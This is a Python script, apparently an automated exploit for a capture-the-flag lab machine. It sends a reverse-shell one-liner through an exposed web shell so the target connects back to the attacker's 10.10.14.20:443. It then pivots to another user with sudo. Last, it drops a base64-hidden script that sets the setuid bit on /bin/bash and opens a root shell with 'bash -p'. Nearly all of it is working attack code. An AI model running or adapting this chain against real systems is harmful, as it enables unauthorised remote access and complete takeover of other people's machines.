#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.68/dev/phpbash.php"
lport = 443

def makeRequest():

    post_data = {
        'cmd': """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    }

    r = requests.post(main_url, data=post_data)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    p1 = log.progress("Pwn")
    p1.status("Ganando acceso al sistema")

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible pwnear el sistema")
    else:
        p1.success("Se ha accedido al sistema como el usuario www-data")

    p2 = log.progress("User Pivoting")
    p2.status("Migrando al usuario scriptmanager")
    time.sleep(2)

    shell.sendline("sudo -u scriptmanager bash")

    p2.success("MigraciÃ³n al usuario scriptmanager satisfactoria")

    p3 = log.progress("Privilege Escalation")
    p3.status("ConvirtiÃ©ndonos al usuario root")
    time.sleep(2)

    shell.sendline("echo aW1wb3J0IG9zCgpvcy5zeXN0ZW0oImNobW9kIDQ3NTUgL2Jpbi9iYXNoIikK | base64 -d > /scripts/test.py")
    time.sleep(60)
    p3.success("Se ha ganado acceso como root")
    shell.sendline("bash -p")
    shell.interactive()
